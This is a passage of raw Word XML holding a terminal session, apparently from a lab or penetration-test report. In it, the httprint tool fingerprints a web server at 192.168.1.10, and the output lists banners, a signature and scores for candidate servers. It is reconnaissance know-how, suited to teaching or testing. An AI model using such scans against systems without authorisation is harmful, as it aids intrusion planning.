          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t># ./</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -h http://192.168.1.10 -s signatures.txt </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41024287" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> v0.301 (beta) - web server fingerprinting tool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBF1062" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(c) 2003-2005 net-square solutions </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>pvt.</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ltd. - see readme.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E44330" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://net-square.com/httprint/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F25C23" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>httprint@net-square.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C55A13" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B1D3697" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Finger Printing on http://192.168.1.10:80/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC3EE5C" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Finger Printing Completed on http://192.168.1.10:80/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499C3666" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>--------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DFC2D8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host: 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B429F81" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Derived Signature:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EDD2D6" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/2.4.3 (Unix) OpenSSL/1.0.1c PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBE0D58" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>811C9DC56ED3C295811C9DC5811C9DC5811C9DC5505FCFE84276E4BB811C9DC5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1912CC40" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>0D7645B5811C9DC5811C9DC5CD37187C811C9DC5811C9DC5811C9DC5811C9DC5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01328095" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>6ED3C2956ED3C2956ED3C295811C9DC5E2CE6927811C9DC56ED3C295811C9DC5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097B72A1" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>6ED3C2956ED3C2952A200B4C6ED3C2956ED3C2956ED3C2956ED3C295E2CE6923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE93B31" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>E2CE69236ED3C295E25A5D20E2CE6927E2CE6923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1190AEB1" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="768A7D09" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Banner Reported: Apache/2.4.3 (Unix) OpenSSL/1.0.1c PHP/5.4.7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EBC013" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Banner Deduced: Apache/2.0.x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243471D8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Score: 95</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B003640" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Confidence: 57.23</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222DF35E" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DE26E0" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Scores: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00865564" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/2.0.x: 95 57.23</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C869407" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/1.</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3.[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4-24]: 92 50.97</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E99AF3" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/1.3.27: 91 48.98</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EA2961" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/1.3.26: 91 48.98</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3742448E" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/1.</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3.[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1-3]: 87 41.55</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044CDF05" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>TUX/2.0 (Linux): 83 34.88</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141477B8" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Apache/1.2.6: 77 26.23</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70418A75" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Com21 Cable Modem: 70 18.02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D69A8B0" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>WebSitePro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>/2.3.18: 70 18.02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797916EA" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Agranat-EmWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>: 69 17.00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35710AF1" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>dwhttpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Sun </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Answerbook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>): 64 12.45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBD83CF" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Oracle Servlet Engine: 64 12.45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D768840" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>thttpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>: 63 11.64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6755AFE0" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>SMC Wireless Router 7004VWBR: 63 11.64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D492028" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EMWHTTPD/1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>60  9.41</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="59637B11" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Intel </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>NetportExpressPro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/1.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>60  9.41</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="58752187" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Belkin Wireless router: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>60  9.41</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="20941688" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/5.0 ASP.NET: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>58  8.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6C3114C1" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/5.1: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>58  8.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="31F6168B" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft-IIS/6.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>58  8.07</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="48CB91A9" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Jetty (unverified): </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>57  7.45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="449FDEF4" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>JRun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web Server: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>56  6.86</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="44391952" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Linksys WRTP54G: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>53  5.24</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5D8D4118" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>AOLserver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/3.5.6: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>52  4.76</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0F071B8D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>TightVNC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>50  3.87</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1EB89DEE" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Lexmark Optra Printer: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>50  3.87</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2B8F85A9" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>RealVNC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/4.0: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>50  3.87</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3C0761D6" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>VisualRoute</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2005 Server Edition: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>50  3.87</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0241267D" w14:textId="77777777" w:rsidR="00776D91" w:rsidRDefault="00776D91" w:rsidP="00776D91">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
